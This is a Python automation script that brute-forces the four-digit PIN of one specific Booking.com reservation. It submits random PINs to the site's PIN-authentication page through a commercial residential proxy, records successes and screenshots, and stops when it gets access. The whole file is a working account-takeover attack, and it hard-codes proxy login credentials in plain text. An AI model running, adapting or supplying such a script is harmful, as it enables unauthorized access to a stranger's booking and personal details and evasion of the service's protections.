from playwright.sync_api import sync_playwright
import os
import time
import random
import json
from datetime import datetime

# Configuration
CONFIRMATION = "6339614781"
AGENT_NAME = "AUTO_HUNTER"
HEADLESS = True
WAIT_TIME = 10  # seconds between attempts
MAX_ATTEMPTS = 10000  # maximum PINs to try
SCREEN_DIR = "screenshots"

# --- Proxy configuration ---
PROXY_CONFIG = {
    "server": "http://us-pr.oxylabs.io:10000",
    "username": "customer-phantomnet1_ONP6z",
    "password": "phantomnet1_ONP6z"
}

os.makedirs(SCREEN_DIR, exist_ok=True)

# Simple logging
def log_result(pin, result, url, attempt_num):
    """Log result to file"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp},{CONFIRMATION},{AGENT_NAME},{pin},{result},{url},attempt_{attempt_num}\n"
    
    with open(f"auto_hunt_log_{CONFIRMATION}.txt", 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    print(f"[{timestamp}] Attempt {attempt_num} - PIN {pin}: {result}")
    
    # If success, save to JSON and exit
    if result == 'SUCCESS':
        success_data = {
            'success_pin': pin,
            'agent': AGENT_NAME,
            'booking_id': CONFIRMATION,
            'timestamp': timestamp,
            'attempt_number': attempt_num
        }
        with open(f"SUCCESS_FOUND_{CONFIRMATION}.json", 'w') as f:
            json.dump(success_data, f, indent=2)
        print(f"🎉 SUCCESS! PIN {pin} found after {attempt_num} attempts!")
        return True
    return False

# Check if success already found
if os.path.exists(f"SUCCESS_FOUND_{CONFIRMATION}.json"):
    with open(f"SUCCESS_FOUND_{CONFIRMATION}.json", 'r') as f:
        success_data = json.load(f)
    print(f"✅ SUCCESS ALREADY FOUND! PIN: {success_data['success_pin']} (attempt {success_data['attempt_number']})")
    exit(0)

# Load already tried PINs to avoid duplicates
tried_pins = set()
if os.path.exists(f"auto_hunt_log_{CONFIRMATION}.txt"):
    with open(f"auto_hunt_log_{CONFIRMATION}.txt", 'r') as f:
        for line in f:
            parts = line.strip().split(',')
            if len(parts) >= 4:
                tried_pins.add(parts[3])  # PIN is in 4th column

print(f"🚀 AUTO PIN HUNTER STARTING")
print(f"📋 Target: Booking ID {CONFIRMATION}")
print(f"🔍 Already tried: {len(tried_pins)} PINs")
print(f"⏱️ Wait time: {WAIT_TIME} seconds between attempts")
print(f"🎯 Max attempts: {MAX_ATTEMPTS}")
print("="*60)

def test_pin(pin, attempt_num):
    """Test a single PIN - one attempt only"""
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=HEADLESS, proxy=PROXY_CONFIG)
            page = browser.new_page()

            try:
                print(f"[{attempt_num}] Testing PIN: {pin}")
                
                # Try to load the page
                page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load", timeout=30000)

                # Wait for the confirmation number input using placeholder
                page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
                page.fill('input[placeholder="e.g. 1234567890"]', CONFIRMATION)
                page.fill('input[placeholder="e.g. 1234"]', pin)

                # Wait for the Continue button to be visible, then click
                try:
                    page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                    page.click('button:has-text("Continue")')
                except Exception:
                    page.wait_for_selector('button[type="submit"]', timeout=5000)
                    page.click('button[type="submit"]')

                # Wait for result
                page.wait_for_function(
                    """
                    () => {
                        return location.href.includes('unique_order_id') ||
                               document.querySelector('.bui-alert--error') !== null
                    }
                    """,
                    timeout=30000
                )

                current_url = page.url
                
                if "unique_order_id=" in current_url:
                    page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_SUCCESS.png")
                    return log_result(pin, 'SUCCESS', current_url, attempt_num)
                elif page.query_selector('.bui-alert--error'):
                    page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_fail.png")
                    log_result(pin, 'FAILURE', current_url, attempt_num)
                    return False
                else:
                    page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_unknown.png")
                    log_result(pin, 'UNKNOWN', current_url, attempt_num)
                    return False
                    
            finally:
                browser.close()
                
    except Exception as e:
        log_result(pin, f'EXCEPTION: {str(e)[:200]}', 'N/A', attempt_num)
        return False

# Main hunting loop
attempt_num = len(tried_pins) + 1
success_found = False

while attempt_num <= MAX_ATTEMPTS and not success_found:
    # Check if another process found success
    if os.path.exists(f"SUCCESS_FOUND_{CONFIRMATION}.json"):
        print("🎉 SUCCESS FOUND BY ANOTHER PROCESS! Stopping.")
        break
    
    # Generate a random PIN that hasn't been tried
    pin = None
    max_gen_attempts = 100
    for _ in range(max_gen_attempts):
        candidate = f"{random.randint(0, 9999):04d}"
        if candidate not in tried_pins:
            pin = candidate
            tried_pins.add(pin)
            break
    
    if pin is None:
        print("❌ No more unique PINs available!")
        break
    
    # Test the PIN
    if test_pin(pin, attempt_num):
        success_found = True
        break
    
    # Wait before next attempt
    if attempt_num < MAX_ATTEMPTS:
        print(f"⏱️ Waiting {WAIT_TIME} seconds before next attempt...")
        time.sleep(WAIT_TIME)
    
    attempt_num += 1

# Final report
print("\n" + "="*60)
print("📊 FINAL REPORT")
print("="*60)
print(f"🎯 Total attempts made: {attempt_num - 1}")
print(f"📋 Booking ID: {CONFIRMATION}")

if success_found:
    print("🎉 MISSION STATUS: SUCCESS!")
else:
    print("🔍 MISSION STATUS: CONTINUING... (restart to continue)")
    
print("="*60)
